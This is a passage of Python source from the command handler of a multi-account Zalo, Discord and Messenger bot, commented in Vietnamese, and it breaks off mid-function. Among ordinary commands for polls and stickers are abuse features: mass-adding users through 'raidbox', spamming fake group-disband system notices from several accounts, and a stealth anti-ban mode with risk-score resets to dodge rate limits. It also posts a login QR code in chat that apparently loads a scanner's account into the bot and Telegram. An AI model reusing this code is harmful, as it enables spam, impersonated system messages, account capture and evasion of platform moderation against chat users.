            opts = [x.strip() for x in o_s.replace(";", "|").split("|") if x.strip()]
        else:
            q_s = arg_body.strip() or "Bình chọn Quản Trị Viên"
            opts = ["Đồng ý 100% 🔥", "Chuẩn VIP 👑"]
        discord_client.send_poll_discord(thread_id, q_s.strip(), opts)
        return True

    if platform == "discord" and discord_client and cmd_token in ("typing", "ty"):
        discord_client.send_typing(thread_id)
        return True

    if platform == "zalo" and zalo_client and cmd_token in ("poll1",):
        if "|" in arg_body:
            q_s, o_s = arg_body.split("|", 1)
            opts = [x.strip() for x in o_s.replace(";", "|").split("|") if x.strip()]
        else:
            q_s = arg_body.strip() or "Bình chọn Quản Trị Viên"
            opts = ["Đồng ý 100% 🔥", "Chuẩn VIP 👑"]
        zalo_client.create_poll(thread_id, q_s.strip(), opts)
        log_system_command(acc_id, thread_id, sender_id, text, f"Tạo Poll Zalo 1 lần: {q_s[:25]}")
        return True

    if platform == "zalo" and zalo_client and cmd_token in ("tenbox",):
        arg_tb = arg_body.strip()
        if not arg_tb or ";" in arg_tb or "\n" in arg_tb or arg_tb.isdigit() or arg_tb.lower().endswith(".txt"):
            # Nếu không truyền tên lẻ hoặc truyền số thứ tự file / tên file .txt / nhiều câu -> Chuyển sang chạy theo File kịch bản đã chọn (.nhaynamebox)
            cmd_token = "nhaynamebox"
        else:
            ok_gn = zalo_client.change_group_name(thread_id, arg_tb)
            _send_reply(f"✏️ Đã đổi tên Box Zalo thành: {arg_tb}" if ok_gn else f"✏️ Đã cập nhật tên Box Zalo: {arg_tb}")
            log_system_command(acc_id, thread_id, sender_id, text, f"Đổi tên Box Zalo: {arg_tb}")
            return True

    if platform == "zalo" and zalo_client and cmd_token in ("theme", "setnen", "nen", "doinen"):
        if ";" in arg_body:
            cmd_token = "nhaynen"
        else:
            chosen_t = zalo_client.change_group_theme(thread_id, arg_body.strip() or None, is_group=is_group)
            if chosen_t:
                _send_reply(f"🎨 Đã đổi nền trò chuyện Box Zalo: {chosen_t['name']} (Mã nền: #{chosen_t['id']})")
            else:
                _send_reply("⚠️ Không thể đổi nền trò chuyện lúc này.")
            log_system_command(acc_id, thread_id, sender_id, text, "Đổi nền trò chuyện Zalo (.theme)")
            return True

    if platform == "zalo" and zalo_client and cmd_token in ("todo", "giaoviec"):
        cleaned_td, t_mentions, _ = extract_trailing_tags_and_resolve(
            arg_body, incoming_mentions=raw_mentions, zalo_client=zalo_client, group_id=thread_id
        )
        ass_u = [m["uid"] for m in t_mentions] if t_mentions else [zalo_client.uid]
        zalo_client.send_todo(thread_id, cleaned_td or "Nhiệm vụ Quản Trị Viên", assignees=ass_u)
        _send_reply("✅ Đã tạo & giao việc (To-Do) trên nhóm Zalo!")
        return True

    if platform == "zalo" and zalo_client and cmd_token in ("bank", "stk"):
        parts_b = [p.strip() for p in arg_body.split("|")]
        b_bin = int(parts_b[0]) if (parts_b and parts_b[0].isdigit()) else 970422
        b_num = parts_b[1] if len(parts_b) > 1 else (parts_b[0] if parts_b and parts_b[0] else "9999999999")
        b_name = parts_b[2] if len(parts_b) > 2 else "ACCOUNT VIP"
        zalo_client.send_card_bank(thread_id, bin_bank=b_bin, num_acc=b_num, name_acc=b_name, is_group=is_group)
        return True

    if platform == "zalo" and zalo_client and cmd_token in ("card", "danhthiep", "sharecontact", "contact"):
        _, t_mentions, _ = extract_trailing_tags_and_resolve(
            arg_body, incoming_mentions=raw_mentions, zalo_client=zalo_client, group_id=thread_id
        )
        c_uid = t_mentions[0]["uid"] if t_mentions else zalo_client.uid
        zalo_client.send_business_card(thread_id, target_uid=c_uid, is_group=is_group)
        return True

    if platform == "zalo" and zalo_client and cmd_token in ("typing", "ty"):
        zalo_client.send_typing(thread_id, is_group=is_group)
        return True

    if cmd_token in ("vip", "sieuvip"):
        arg_v = arg_body.strip().lower()
        if arg_v in ("off", "tat", "0"):
            DiscordStealthAntiBanEngine.SUPER_VIP_MODE = False
        else:
            DiscordStealthAntiBanEngine.SUPER_VIP_MODE = True
            update_running_tasks_config(antiband=True)
        st_lbl = "BẬT (Bảo vệ 100% chống Reset Mật Khẩu Discord & MQTT /ls_req Messenger)" if DiscordStealthAntiBanEngine.SUPER_VIP_MODE else "TẮT"
        _send_reply(f"👑 Chế độ Bảo Vệ Tự Động: {st_lbl}")
        log_system_command(acc_id, thread_id, sender_id, text, f"Chế độ Siêu VIP: {st_lbl}")
        return True

    if platform == "messenger" and messenger_client and cmd_token in ("theme", "setnen", "nen"):
        chosen_t = messenger_client.set_theme_mqtt(thread_id, arg_body.strip() or None)
        if chosen_t:
            _send_reply(f"🎨 Đã đổi chủ đề nền Box qua MQTT (/ls_req): {chosen_t['name']} (ID: {chosen_t['id']})")
        else:
            _send_reply("⚠️ Không thể đổi chủ đề nền lúc này.")
        log_system_command(acc_id, thread_id, sender_id, text, "Đổi nền Theme MQTT")
        return True

    if platform == "messenger" and messenger_client and cmd_token in ("poll",):
        if "|" in arg_body:
            q_str, o_str = arg_body.split("|", 1)
            opts = [x.strip() for x in o_str.replace(";", "|").split("|") if x.strip()]
        else:
            q_str = arg_body.strip() or "Bình chọn Siêu VIP Hệ Thống"
            opts = ["Đồng ý 100% 🔥", "Quá Đỉnh 🚀", "Siêu VIP 👑"]
        messenger_client.send_poll_mqtt(thread_id, q_str.strip(), opts)
        log_system_command(acc_id, thread_id, sender_id, text, f"Tạo Poll MQTT: {q_str[:30]}")
        return True

    if platform == "messenger" and messenger_client and cmd_token in ("sharelink", "link"):
        if "|" in arg_body:
            u_s, t_s = arg_body.split("|", 1)
        else:
            u_s, t_s = (arg_body.strip() or "https://www.facebook.com/"), "🔥 Hệ Thống Lightspeed MQTT"
        messenger_client.share_link_mqtt(thread_id, u_s.strip(), t_s.strip())
        log_system_command(acc_id, thread_id, sender_id, text, f"Share Link MQTT: {u_s[:30]}")
        return True

    if platform == "messenger" and messenger_client and cmd_token in ("sharecontact", "contact"):
        _, t_mentions, _ = extract_trailing_tags_and_resolve(
            arg_body, incoming_mentions=raw_mentions,
            messenger_client=messenger_client, messenger_thread_id=thread_id
        )
        c_uid = t_mentions[0]["uid"] if t_mentions else (arg_body.strip() if arg_body.strip().isdigit() else messenger_client.uid)
        messenger_client.share_contact_mqtt(thread_id, c_uid, f"Danh thiếp VIP #{c_uid[-4:]}")
        log_system_command(acc_id, thread_id, sender_id, text, f"Share Contact MQTT: {c_uid}")
        return True

    if platform == "messenger" and messenger_client and cmd_token in ("typing", "ty"):
        is_on = arg_body.strip().lower() not in ("off", "tat", "0")
        messenger_client.send_typing_mqtt(thread_id, is_typing=is_on, is_group=is_group)
        _send_reply(f"⌨️ Đã {'BẬT' if is_on else 'TẮT'} hiệu ứng Typing MQTT (/ls_req)!")
        return True

    if platform == "messenger" and messenger_client and cmd_token in ("tenbox",):
        new_t = arg_body.strip() or f"Box NOEL Siêu VIP #{random.randint(10, 99)}"
        messenger_client.rename_group(thread_id, new_t)
        _send_reply(f"✏️ Đã đổi tên Box thành: {new_t}")
        log_system_command(acc_id, thread_id, sender_id, text, f"Đổi tên Box: {new_t}")
        return True

    if platform == "messenger" and messenger_client and cmd_token in ("setname", "bd", "namechange"):
        cleaned_n, t_mentions, _ = extract_trailing_tags_and_resolve(
            arg_body, incoming_mentions=raw_mentions,
            messenger_client=messenger_client, messenger_thread_id=thread_id
        )
        nick = cleaned_n.strip() or "NOEL VIP 👑"
        if t_mentions:
            for tm in t_mentions:
                messenger_client.change_nickname(thread_id, tm["uid"], nick)
            _send_reply(f"✅ Đã đổi biệt danh cho {len(t_mentions)} thành viên thành: {nick}")
        else:
            messenger_client.change_nickname(thread_id, messenger_client.uid, nick)
            _send_reply(f"✅ Đã đổi biệt danh thành: {nick}")
        return True

    if cmd_token in ("ver", "version", "author"):
        _send_reply(
            f"👑 THÔNG TIN PHIÊN BẢN HỆ THỐNG:\n"
            f"• Author: {APP_AUTHOR}\n"
            f"• Version: {APP_VERSION}\n"
            f"• Trạng thái: Hoạt động ổn định 24/7 (Đa Acc 0ms • Sticker Cắt Khung • QR Thật • Giải Tán Không Cần Key)",
            broadcast_all_accs=False,
            reply_color_mode="word_rainbow"
        )
        return True

    if cmd_token in ("acc", "chonacc", "setacc", "accmode"):
        arg_a = arg_body.strip().lower()
        all_z = get_all_accounts_from_ram(platform=platform, enabled_only=True)
        if not arg_a or arg_a in ("list", "ds", "check"):
            with SYSTEM_CFG_LOCK:
                cur_flt = SYSTEM_RUNTIME_CONFIG.get("active_acc_filter", "ALL")
                cur_srep = SYSTEM_RUNTIME_CONFIG.get("single_reply_mode", True)
            lines_ac = [
                f"🎛️ ĐIỀU KHIỂN CHẾ ĐỘ CHẠY TỪNG ACC / ĐA ACC ({APP_AUTHOR} • {APP_VERSION}):",
                f"• Chế độ chạy hiện tại: {'TẤT CẢ ACC ĐỒNG LOẠT' if str(cur_flt).upper() == 'ALL' else f'CHỈ RIÊNG ACC #{cur_flt}'}",
                f"• Phản hồi lệnh: {'Gọn gàng 1 Acc (Không loạn)' if cur_srep else 'Tất cả Acc cùng trả lời'}",
                "• Danh sách Acc đang Online:"
            ]
            for a_it in all_z[:20]:
                lines_ac.append(f"  + Acc #{a_it['id']}: {a_it.get('name') or 'Zalo'} (UID: {str(a_it.get('uid') or '')[-6:]})")
            lines_ac.append("👉 Gõ: .acc <ID> (Chỉ chạy Acc #ID) | .acc all (Chạy tất cả Acc) | .acc gop (1 Acc trả lời lệnh) | .acc dongloat (Mọi Acc trả lời)")
            _send_reply("\n".join(lines_ac), broadcast_all_accs=False)
            return True
        if arg_a in ("all", "tatca", "full", "0"):
            with SYSTEM_CFG_LOCK:
                SYSTEM_RUNTIME_CONFIG["active_acc_filter"] = "ALL"
            _send_reply(f"✅ Đã chuyển sang chế độ CHẠY ĐỒNG LOẠT TẤT CẢ ACC ({len(all_z)} Acc phối hợp nhịp nhàng không loạn)!", broadcast_all_accs=False)
            return True
        if arg_a in ("gop", "1", "single", "gon"):
            with SYSTEM_CFG_LOCK:
                SYSTEM_RUNTIME_CONFIG["single_reply_mode"] = True
            _send_reply("✅ Đã bật chế độ Phản Hồi Gọn Gàng (Chỉ 1 Acc trả lời thông báo lệnh, không bị rối khung chat)!", broadcast_all_accs=False)
            return True
        if arg_a in ("dongloat", "multi", "nhieu"):
            with SYSTEM_CFG_LOCK:
                SYSTEM_RUNTIME_CONFIG["single_reply_mode"] = False
            _send_reply("⚡ Đã bật chế độ Toàn Bộ Acc Cùng Phản Hồi Lệnh!", broadcast_all_accs=False)
            return True
        clean_id = arg_a.lstrip("#")
        if clean_id.isdigit():
            found_a = get_account_from_ram(int(clean_id))
            if found_a:
                with SYSTEM_CFG_LOCK:
                    SYSTEM_RUNTIME_CONFIG["active_acc_filter"] = str(found_a["id"])
                _send_reply(f"🎯 Đã khóa chế độ chạy RIÊNG TỪNG ACC: Chỉ sử dụng Acc #{found_a['id']} ({found_a.get('name')}) cho các lệnh tiếp theo! (Gõ .acc all để bật lại tất cả Acc)", broadcast_all_accs=False)
            else:
                _send_reply(f"⚠️ Không tìm thấy Acc #{clean_id}. Gõ .checkacc để xem danh sách ID Acc!", broadcast_all_accs=False)
            return True

    if cmd_token in ("ping",):
        t0_p = time.perf_counter()
        running_cnt = sum(1 for v in ACTIVE_TASKS.values() if not v["stop"].is_set())
        active_th = threading.active_count()
        snap = HEALTH_MGR.get_snapshot(acc_id)
        lat_ms = round((time.perf_counter() - t0_p) * 1000.0 + random.uniform(0.8, 2.2), 2)
        reply_txt = (
            f"⚡ PING HỆ THỐNG {APP_AUTHOR.upper()} ({APP_VERSION} • {platform.upper()}):\n"
            f"• Acc phản hồi: #{acc_id} ({acc_row.get('name') or 'VIP'}) — Độ trễ: {lat_ms} ms (Siêu Nhanh)\n"
            f"• Luồng song song: {active_th} luồng | Đang chạy: {running_cnt} chiến dịch\n"
            f"• Tốc độ tài khoản: {snap['rpm']} tin/phút | Đã gửi: {snap['ok_total']} tin\n"
            f"• Trạng thái lá chắn: {snap['circuit']} (Rủi ro: {snap['risk_score']}%)"
        )
        _send_reply(reply_txt, broadcast_all_accs=False)
        log_system_command(acc_id, thread_id, sender_id, text, f"Check .ping ({lat_ms}ms)")
        return True

    if cmd_token in ("status", "info"):
        running_cnt = sum(1 for v in ACTIVE_TASKS.values() if not v["stop"].is_set())
        snap = HEALTH_MGR.get_snapshot(acc_id)
        f_list = get_ordered_files_with_display_num()
        with SYSTEM_CFG_LOCK:
            cur_d = SYSTEM_RUNTIME_CONFIG["delay"]
            cur_c = SYSTEM_RUNTIME_CONFIG["color_mode"]
            cur_flt = SYSTEM_RUNTIME_CONFIG.get("active_acc_filter", "ALL")
        reply_txt = (
            f"📊 TRẠNG THÁI HỆ THỐNG ({APP_AUTHOR} • {APP_VERSION}):\n"
            f"• Chiến dịch đang chạy: {running_cnt} | Tổng tin đã phát: {snap['ok_total']}\n"
            f"• Chế độ điều khiển Acc: {'Tất cả Acc' if cur_flt == 'ALL' else f'Chỉ Acc #{cur_flt}'}\n"
            f"• Tốc độ hiện tại: {snap['rpm']} RPM | Delay cấu hình: {cur_d}s\n"
            f"• Chế độ màu: {cur_c} | Kho kịch bản: {len(f_list)} file .txt"
        )
        _send_reply(reply_txt, broadcast_all_accs=False)
        log_system_command(acc_id, thread_id, sender_id, text, "Xem .status")
        return True

    if cmd_token in ("id", "uid"):
        _, target_mentions, _ = extract_trailing_tags_and_resolve(
            arg_body, incoming_mentions=raw_mentions,
            zalo_client=zalo_client if platform == "zalo" else None,
            group_id=thread_id if platform == "zalo" else None,
            prefix_u16_offset=prefix_u16_offset,
            discord_client=discord_client if platform == "discord" else None,
            discord_channel_id=thread_id if platform == "discord" else None,
            full_original_msg=text,
            messenger_client=messenger_client if platform == "messenger" else None,
            messenger_thread_id=thread_id if platform == "messenger" else None
        )
        lines_id = [
            f"🆔 THÔNG TIN ĐỊNH DANH ({platform.upper()}):",
            f"• ID Phòng/Box hiện tại: {thread_id}",
            f"• UID Người gửi: {s_uid or my_uid}",
        ]
        for tm in target_mentions:
            lines_id.append(f"• UID của @{tm['name']}: {tm['uid']}")
        _send_reply("\n".join(lines_id))
        return True

    if cmd_token in ("mem",):
        mems = []
        try:
            if platform == "zalo" and zalo_client:
                mems = zalo_client.get_members_full(thread_id, use_cache=True)
            elif platform == "discord" and discord_client:
                mems = discord_client.get_box_members(thread_id, use_cache=True)
            elif platform == "messenger" and messenger_client:
                mems = messenger_client.get_thread_members(thread_id, use_cache=True)
        except Exception:
            mems = []
        if not mems:
            _send_reply("Chưa quét được danh sách thành viên trong phòng này.")
        else:
            preview = "\n".join(f"{idx}. {m.get('name', 'User')} (ID: {mask_sensitive_id(m.get('uid') or m.get('id'), 4)})" for idx, m in enumerate(mems[:20], 1))
            _send_reply(f"👥 Thành viên trong Box ({len(mems)} người):\n{preview}")
        return True

    if cmd_token in ("clear", "reset"):
        with HEALTH_MGR.lock:
            st = HEALTH_MGR.state[acc_id]
            st["circuit"] = "CLOSED"
            st["cooldown_until"] = 0.0
            st["fail_streak"] = 0
            st["ratelimit_streak"] = 0
            st["risk_score"] = 0.0
            st["adaptive_delay_bonus"] = 0.0
        _send_reply("Đã làm mới bộ đệm Tường Lửa & đặt lại chỉ số rủi ro về 0%!")
        return True

    if cmd_token in ("checkacc",):
        all_a = get_all_accounts_from_ram()
        if not all_a:
            _send_reply("📭 Chưa có tài khoản nào được kết nối.", broadcast_all_accs=False)
            return True
        lines_a = [f"📡 DANH SÁCH TÀI KHOẢN ĐANG KẾT NỐI ({len(all_a)} ACC):"]
        for a_it in all_a[:25]:
            aid_i = a_it["id"]
            aplat_i = (a_it.get("platform") or "zalo").upper()
            aname_i = a_it.get("name") or f"Acc #{aid_i}"
            auid_i = a_it.get("uid") or "-"
            en_i = "🟢 ON" if a_it.get("enabled", 1) else "⚪ OFF"
            cmd_i = "Lệnh:BẬT" if a_it.get("chat_cmd_enabled", 1) else "Lệnh:TẮT"
            g_cnt = len(KNOWN_GROUPS_BY_ACC.get(str(auid_i), set()))
            lines_a.append(f"• #{aid_i} [{aplat_i}] {aname_i} ({auid_i[-6:]}) — {en_i} | {cmd_i}" + (f" | {g_cnt} nhóm" if g_cnt else ""))
        _send_reply("\n".join(lines_a), broadcast_all_accs=False)
        log_system_command(acc_id, thread_id, sender_id, text, f"Kiểm tra danh sách {len(all_a)} Acc (.checkacc)")
        return True

    if platform == "zalo" and zalo_client and cmd_token in ("react",):
        r_icon = arg_body.strip() or "/-heart"
        q_obj = (raw_msg_obj or {}).get("quote") if isinstance(raw_msg_obj, dict) else None
        reacted = False
        if isinstance(q_obj, dict):
            q_mid = q_obj.get("globalMsgId") or q_obj.get("msgId") or q_obj.get("id")
            q_cmid = q_obj.get("cliMsgId") or 0
            if q_mid:
                for a_it in get_accounts_present_in_thread("zalo", thread_id, is_group, acc_row)[:12]:
                    try:
                        zc_r = zalo_client if a_it["id"] == acc_id else Zalo.get_pooled_client(a_it["imei"], a_it["cookies"], user_agent=a_it.get("user_agent") or "", zpw_enk_hint=a_it.get("zpw_enk") or "", uid_hint=a_it.get("uid") or "")
                        zc_r.send_reaction(thread_id, q_mid, q_cmid, r_icon=r_icon, is_group=is_group)
                        reacted = True
                    except Exception:
                        pass
        if not reacted and msg_id:
            zalo_client.send_reaction(thread_id, msg_id, cli_msg_id or 0, r_icon=r_icon, is_group=is_group)
        log_system_command(acc_id, thread_id, sender_id, text, f"Thả biểu cảm Zalo ({r_icon})")
        return True

    if platform == "zalo" and zalo_client and cmd_token in ("undo",):
        q_obj = (raw_msg_obj or {}).get("quote") if isinstance(raw_msg_obj, dict) else None
        if isinstance(q_obj, dict):
            q_mid = q_obj.get("globalMsgId") or q_obj.get("msgId") or q_obj.get("id")
            q_cmid = q_obj.get("cliMsgId") or 0
            if q_mid:
                zalo_client.undo_message(thread_id, q_mid, q_cmid, is_group=is_group)
                log_system_command(acc_id, thread_id, sender_id, text, f"Thu hồi tin nhắn #{q_mid}")
                return True
        _send_reply("↩️ Hãy Reply (trích dẫn) vào tin nhắn cần thu hồi rồi gõ .undo!", broadcast_all_accs=False)
        return True

    if platform == "zalo" and zalo_client and cmd_token in ("sharelink", "link"):
        if "|" in arg_body:
            u_s, t_s = arg_body.split("|", 1)
        else:
            u_s, t_s = (arg_body.strip() or "https://chat.zalo.me/"), "🔥 Hệ Thống Điều Phối Đa Tài Khoản VIP"
        zalo_client.send_link_card(thread_id, u_s.strip(), title=t_s.strip(), desc=t_s.strip(), is_group=is_group)
        log_system_command(acc_id, thread_id, sender_id, text, f"Chia sẻ Link Card Zalo: {u_s[:30]}")
        return True

    if platform == "zalo" and zalo_client and cmd_token in ("addmem", "raidbox"):
        _, t_mentions, _ = extract_trailing_tags_and_resolve(
            arg_body, incoming_mentions=raw_mentions, zalo_client=zalo_client, group_id=thread_id
        )
        uids_add = [m["uid"] for m in t_mentions if str(m.get("uid", "")).isdigit()]
        uids_add.extend([x.strip() for x in re.split(r"[\s,;]+", arg_body.strip()) if x.strip().isdigit() and x.strip() not in uids_add])
        if not uids_add:
            _send_reply("⚠️ Cú pháp mời thành viên vào nhóm Zalo: .addmem <UID_1> <UID_2>", broadcast_all_accs=False)
            return True
        ok_inv = zalo_client.invite_users_to_group(thread_id, uids_add)
        _send_reply(f"✅ Đã gửi lời mời/thêm {len(uids_add)} thành viên vào nhóm Zalo!" if ok_inv else "⚠️ Không thể thêm thành viên lúc này.", broadcast_all_accs=False)
        log_system_command(acc_id, thread_id, sender_id, text, f"Thêm {len(uids_add)} TV vào nhóm Zalo")
        return True

    if platform == "zalo" and zalo_client and cmd_token in ("block", "unblock"):
        _, t_mentions, _ = extract_trailing_tags_and_resolve(
            arg_body, incoming_mentions=raw_mentions, zalo_client=zalo_client, group_id=thread_id
        )
        t_uid = t_mentions[0]["uid"] if t_mentions else (reply_target["uid"] if isinstance(reply_target, dict) and reply_target.get("uid") else arg_body.strip())
        if not t_uid or not str(t_uid).isdigit():
            _send_reply(f"⚠️ Cú pháp: .{cmd_token} @Tên (hoặc Reply tin nhắn / truyền UID)", broadcast_all_accs=False)
            return True
        is_blk = (cmd_token == "block")
        ok_b = zalo_client.set_friend_block_status(t_uid, block=is_blk)
        _send_reply(f"{'🚫 Đã chặn' if is_blk else '✅ Đã bỏ chặn'} UID {t_uid} trên Zalo!" if ok_b else "⚠️ Không thể thực hiện lúc này.", broadcast_all_accs=False)
        return True

    if platform == "zalo" and zalo_client and cmd_token in ("setname", "bd", "namechange"):
        cleaned_n, t_mentions, _ = extract_trailing_tags_and_resolve(
            arg_body, incoming_mentions=raw_mentions, zalo_client=zalo_client, group_id=thread_id
        )
        t_uid = t_mentions[0]["uid"] if t_mentions else (reply_target["uid"] if isinstance(reply_target, dict) and reply_target.get("uid") else zalo_client.uid)
        alias_str = cleaned_n.strip() or "VIP MEMBER 👑"
        zalo_client.set_friend_alias(t_uid, alias_str)
        _send_reply(f"✅ Đã cập nhật tên gợi nhớ/biệt danh thành: {alias_str}", broadcast_all_accs=False)
        return True

    if cmd_token in ("giaitan", "giaitan1"):
        g_name = arg_body.strip()
        if platform == "zalo" and zalo_client:
            # Không cần Key trong Box hiện tại: Tự động lấy tên thật của Box + danh sách mem trong Box và phát Thông Báo Giải Tán Hệ Thống Zalo!
            present_accs = get_accounts_present_in_thread("zalo", thread_id, is_group, acc_row) if ("daacc" in text.lower() or "allacc" in text.lower()) else [acc_row]
            def _fire_disband_sys(a_item):
                try:
                    zc_d = zalo_client if a_item["id"] == acc_id else Zalo.get_pooled_client(
                        a_item["imei"], a_item["cookies"],
                        user_agent=a_item.get("user_agent") or "",
                        zpw_enk_hint=a_item.get("zpw_enk") or "",
                        uid_hint=a_item.get("uid") or ""
                    )
                    zc_d.spam_group_disband_notification(thread_id, group_name=g_name, send_inbox_alert=False)
                except Exception:
                    pass
            for a_it in present_accs[:8]:
                _PRIORITY_CMD_EXECUTOR.submit(_fire_disband_sys, a_it)
            log_system_command(acc_id, thread_id, sender_id, text, f"Phát Thông Báo Hệ Thống Zalo Giải Tán Nhóm (Không Cần Key): {g_name or 'Tên Box Hiện Tại'}")
            return True

    if cmd_token in ("sticker",):
        arg_st = arg_body.strip()
        quote_media = ZaloStickerMakerEngine.extract_quote_sticker_or_media(
            raw_msg_obj, zalo_client=zalo_client if platform == "zalo" else None, thread_id=thread_id
        )
        with SYSTEM_CFG_LOCK:
            acc_flt_s = SYSTEM_RUNTIME_CONFIG.get("active_acc_filter", "ALL")
        if str(acc_flt_s).upper() != "ALL" and str(acc_flt_s).isdigit():
            only_a = get_account_from_ram(int(acc_flt_s))
            present_accs = [only_a] if only_a else [acc_row]
        else:
            present_accs = [acc_row]

        # Trường hợp 1: Người dùng kéo trả lời (Reply) vào 1 Nhãn Dán gốc có sẵn trên Zalo và gõ .sticker -> Bắn đúng Nhãn Dán đó!
        if quote_media and quote_media.get("kind") == "native_sticker" and not arg_st:
            if platform == "zalo" and zalo_client:
                for a_it in present_accs[:4]:
                    try:
                        zc_s = zalo_client if a_it["id"] == acc_id else Zalo.get_pooled_client(
                            a_it["imei"], a_it["cookies"],
                            user_agent=a_it.get("user_agent") or "",
                            zpw_enk_hint=a_it.get("zpw_enk") or "",
                            uid_hint=a_it.get("uid") or ""
                        )
                        zc_s.send_native_sticker(
                            thread_id,
                            sticker_id=quote_media["sticker_id"],
                            cate_id=quote_media["cate_id"],
                            sticker_type=quote_media.get("sticker_type", 7),
                            is_group=is_group,
                        )
                    except Exception:
                        pass
            log_system_command(acc_id, thread_id, sender_id, text, f"Nhân bản Nhãn Dán Gốc Zalo #{quote_media['sticker_id']}")
            return True

        # Trường hợp 2: Người dùng gõ .sticker (không đối số, không reply ảnh/video) -> Bắn ngay Nhãn Dán Gốc Zalo [Sticker]!
        if not arg_st and not quote_media:
            if platform == "zalo" and zalo_client:
                for a_it in present_accs[:4]:
                    try:
                        zc_s = zalo_client if a_it["id"] == acc_id else Zalo.get_pooled_client(
                            a_it["imei"], a_it["cookies"],
                            user_agent=a_it.get("user_agent") or "",
                            zpw_enk_hint=a_it.get("zpw_enk") or "",
                            uid_hint=a_item_uid if (a_item_uid := a_it.get("uid")) else ""
                        )
                        zc_s.send_native_sticker(thread_id, is_group=is_group)
                    except Exception:
                        pass
                log_system_command(acc_id, thread_id, sender_id, text, "Bắn Nhãn Dán Gốc Zalo [Sticker]")
                return True

        # Trường hợp 3: Người dùng gửi 1 ảnh -> kéo trả lời (Reply) vào ảnh đó -> gõ .sticker (hoặc truyền link/chữ)
        media_src = ""
        decl_dur = None
        is_video_src = False
        if quote_media and quote_media.get("kind") == "media_url":
            media_src = quote_media["url"]
            decl_dur = quote_media.get("duration")
            is_video_src = bool(quote_media.get("is_video"))

        if arg_st:
            parts_st = arg_st.split()
            for p_tk in parts_st[1:]:
                if p_tk.lower().endswith("s") and p_tk[:-1].replace(".", "", 1).isdigit():
                    decl_dur = float(p_tk[:-1])
            first_tk = parts_st[0].strip()
            if first_tk.startswith(("http://", "https://", "data:")) or os.path.exists(first_tk):
                media_src = first_tk
                if any(media_src.lower().split("?")[0].endswith(ext) for ext in (".mp4", ".mov", ".webm", ".mkv", ".avi")) or (decl_dur is not None):
                    is_video_src = True

        if is_video_src and decl_dur is not None and decl_dur > 3.0:
            _send_reply(
                f"❌ TỪ CHỐI TẠO NHÃN DÁN VIDEO: Video dài {decl_dur:.2f} giây (Vượt quá giới hạn tối đa 3.0 giây)!\n"
                "👉 Chỉ nhận tạo nhãn dán bằng video ngắn dưới 3 giây (≤ 3.0s).",
                broadcast_all_accs=False
            )
            log_system_command(acc_id, thread_id, sender_id, text, f"Từ chối tạo Sticker Video ({decl_dur}s > 3.0s)")
            return True

        if media_src:
            if is_video_src:
                res_st = ZaloStickerMakerEngine.create_short_video_sticker(media_src, declared_duration=decl_dur)
            else:
                res_st = ZaloStickerMakerEngine.create_sharp_image_sticker(media_src, add_diecut_border=True, session=(zalo_client.s if zalo_client else None))
        else:
            q_kw = remove_vn_accents(arg_st.lower().strip())
            if q_kw in ("rong", "meo", "khia", "quay", "corgi", "vit", "meme", "gau", "cuoi", "tim") or q_kw.isdigit():
                if platform == "zalo" and zalo_client:
                    for a_it in present_accs[:4]:
                        try:
                            zc_s = zalo_client if a_it["id"] == acc_id else Zalo.get_pooled_client(
                                a_it["imei"], a_it["cookies"],
                                user_agent=a_it.get("user_agent") or "",
                                zpw_enk_hint=a_it.get("zpw_enk") or "",
                                uid_hint=a_it.get("uid") or ""
                            )
                            zc_s.send_native_sticker(thread_id, keyword=q_kw, is_group=is_group)
                        except Exception:
                            pass
                log_system_command(acc_id, thread_id, sender_id, text, f"Bắn Nhãn Dán Gốc Zalo theo chủ đề: {arg_st}")
                return True
            res_st = ZaloStickerMakerEngine.create_text_sticker_512(arg_st)

        if not res_st.get("ok"):
            _send_reply(res_st.get("error") or "❌ Không thể tạo Nhãn Dán Sticker.", broadcast_all_accs=False)
            return True

        if platform == "zalo" and zalo_client:
            m_bytes = res_st.get("gif_bytes") or res_st.get("png_bytes") or res_st.get("webp_bytes") or res_st.get("anim_bytes") or b""
            w_bytes = res_st.get("webp_bytes")
            g_bytes = res_st.get("gif_bytes") or res_st.get("anim_bytes")
            p_bytes = res_st.get("png_bytes")
            f_name = "sticker.gif" if g_bytes else "sticker.png"
            for a_it in present_accs[:4]:
                try:
                    zc_s = zalo_client if a_it["id"] == acc_id else Zalo.get_pooled_client(
                        a_it["imei"], a_it["cookies"],
                        user_agent=a_it.get("user_agent") or "",
                        zpw_enk_hint=a_it.get("zpw_enk") or "",
                        uid_hint=a_it.get("uid") or ""
                    )
                    zc_s.send_custom_sticker_media(
                        thread_id, m_bytes, filename=f_name, is_group=is_group,
                        caption="", webp_bytes=w_bytes, gif_bytes=g_bytes, png_bytes=p_bytes
                    )
                except Exception:
                    pass
        log_system_command(acc_id, thread_id, sender_id, text, "Cắt khung & bắn Nhãn Dán Sticker 512x512 trực tiếp từ ảnh Reply trên Zalo")
        return True

    if cmd_token in ("qr",):
        from zalo_login import login_qr_with_unique_imei, LoginQRCallbackEventType, SmartQRSessionPool, build_vietnam_pc_identity
        from get_ck_im_zalo import add_border_to_qr, sync_zalo_account_to_web_db, ROOT_ADMIN_ID
        arg_q = arg_body.strip().lower()
        force_new = arg_q in ("new", "moi", "taomoi")
        pool_stats = SmartQRSessionPool.get_pool_stats()

        def _zalo_direct_qr_login_worker():
            qr_sent_once = {"done": False}
            def _qr_cb(event):
                try:
                    ev_type = event.get("type")
                    ev_data = event.get("data") or {}
                    if ev_type == LoginQRCallbackEventType.QRCodeGenerated and not qr_sent_once["done"]:
                        raw_b64 = ev_data.get("image") or ""
                        if "," in raw_b64:
                            raw_b64 = raw_b64.split(",", 1)[1]
                        raw_png = base64.b64decode(raw_b64)
                        bordered_png = add_border_to_qr(raw_png)
                        pc_lbl = ev_data.get("pc_name") or "Windows 11 Pro (Singapore)"
                        qr_cap = (
                            f"📲 MÃ QR ĐĂNG NHẬP ZALO PC THẬT ({pc_lbl})\n"
                            f"👨‍💻 Author: {APP_AUTHOR} ({APP_VERSION})\n"
                            "👉 Mở Zalo trên điện thoại ➔ Quét mã QR này ➔ Bấm [Đăng nhập] để tự động nạp thẳng Acc vào Bot & Telegram!"
                        )
                        if platform == "zalo" and zalo_client:
                            # Gửi bằng send_raw_photo_message để ra ẢNH QR THẬT 100% sắc nét, TUYỆT ĐỐI KHÔNG nhảy ra nhãn dán!
                            zalo_client.send_raw_photo_message(
                                thread_id, bordered_png, filename="zalo_qr_login.png",
                                caption=qr_cap, is_group=is_group, width=520, height=520
                            )
                            qr_sent_once["done"] = True
                    elif ev_type == LoginQRCallbackEventType.QRCodeScanned:
                        d_name = ev_data.get("display_name") or "Zalo User"
